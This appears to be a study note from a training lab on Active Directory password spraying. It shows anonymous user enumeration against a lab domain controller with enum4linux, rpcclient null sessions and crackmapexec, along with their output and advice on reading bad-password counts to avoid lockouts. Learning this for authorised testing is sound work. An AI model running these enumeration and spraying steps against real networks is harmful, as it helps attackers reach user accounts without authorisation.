- To create password list we need valid user from `Domain Controller`. 
- Utilizing the `LDAP` anonymous bind to query `LDAP` anonymously and pull down the domain user list. 
- Utilizing a tool like `kerbrute` to validate user utilizing a word list like [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames), `github`, or [linkedin2username](https://github.com/initstring/linkedin2username) to create list of potentially valid user. 
- Using set of credentials from `Linux` or `Window` attack system get by `client` or  `LLMNR/NBT-NS` response poisoning using `Responder` or even a successful password spray using a smaller wordlist.

Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include [enum4linux](https://github.com/portcullislabs/enum4linux), [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), among others. Here we do some filtering and obtain list of usernames. 

```shell
malvvare@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>
```

We can use the `enumdomusers` command after connecting anonymously using `rpcclient`.
#### Using rpcclient
```shell
malvvare@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>
```

we use `crackmap` with `--users` flag that help to see `badpwdcount` mean invalid login attempts and we can remove account from list that close to threshold and `baddpwntime` show date and time when bad password attempts. we can see how close account is `badpwncount` reset. To get total accurate accounts bad password query each domain controller and use sum value or query domain controller with `PDC` emulator `FSMO` role.

#### Using Flag
```shell
crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228

```

